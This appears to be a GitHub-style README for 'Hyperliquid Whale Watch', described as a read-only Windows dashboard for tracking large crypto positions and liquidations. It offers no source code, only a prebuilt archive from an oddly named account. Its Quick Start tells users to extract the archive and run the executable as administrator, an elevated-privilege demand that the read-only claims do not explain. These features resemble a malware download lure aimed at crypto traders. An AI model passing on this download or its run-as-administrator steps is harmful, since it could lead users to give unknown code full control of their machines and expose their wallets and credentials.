# Hyperliquid Whale Watch

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop whale tracker for Hyperliquid — monitor large positions, wallet PnL, and liquidation risk in real time.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/hectopebblesupervise/hyperliquid-whale-watch-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Desktop whale tracker for Hyperliquid |
| **Who it's for** | Traders who want to see where smart money is positioned |
| **What it solves** | Whale tracking requires self-hosted Python or browser tabs |
| **How it works** | Read-only queries to Hyperliquid's public API |

---

## 🔥 Why This Exists

Hyperliquid is one of the few crypto venues where **every position is public**. You can see exactly what the largest wallets are doing — entry prices, liquidation levels, unrealized PnL. That transparency is valuable. But the tools to access it are fragmented.

Existing options are either **self-hosted Python servers** (like hyperliquid-copy-trader, which requires Flask and a browser tab) or **web terminals** that bury whale data under charts and indicators. Neither is a clean desktop dashboard.

This tracker fills that gap. It's read-only. No trading. No API keys. No wallet connection. Just data.

---

## 🧩 What It Does

### Whale Feed
- Largest open positions on Hyperliquid
- Entry price, liquidation price, unrealized PnL, leverage
- Filter by notional value (default: $1M+)

### Wallet Tracker
- Add any wallet address to monitor
- See open positions, trade history, cumulative PnL
- Sort by profitability or position size

### Liquidation Radar
- Positions closest to liquidation
- Bucketed by distance: under 1%, 2%, 5%
- Long vs. short totals at each threshold

### Market Sentiment
- Long/short ratio: top 100 positions vs. all accounts
- Spot when the largest money leans opposite to retail
- 7-day trend of the split

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 8 GB | 16 GB |
| **Storage** | 100 MB | 200 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Network** | Broadband | Low-latency connection |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `HLWhaleWatch.exe` as administrator
4. **Click** Refresh — the tracker fetches public data
5. **Add** wallet addresses to monitor

---

## ❓ FAQ

**Does this trade for me?**
No — it's a read-only dashboard. No trading, no API keys, no wallet connection.

**Do I need an API key?**
No — Hyperliquid's public API is open for market data and position queries.

**Does it work offline?**
The tracker displays cached data offline. Fresh data requires internet.

**Will I get banned?**
This is a read-only data viewer. It does not interact with any exchange or execute transactions.

**How accurate is the data?**
Hyperliquid's API is the source. Data refreshes on the interval you set (default: 30 seconds).

**How do I uninstall?**
Delete the tracker folder. No registry entries or system changes are made.

---

## 🗺️ Roadmap

- [ ] Telegram alerts for whale position changes
- [ ] Historical whale performance charts
- [ ] Multi-wallet comparison view
- [ ] Liquidation heatmap

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/hectopebblesupervise/hyperliquid-whale-watch-2026/releases/tag/1.0.0)

**Version 1.0.0** — Whale Watch · Read-Only Dashboard · MIT

</div>
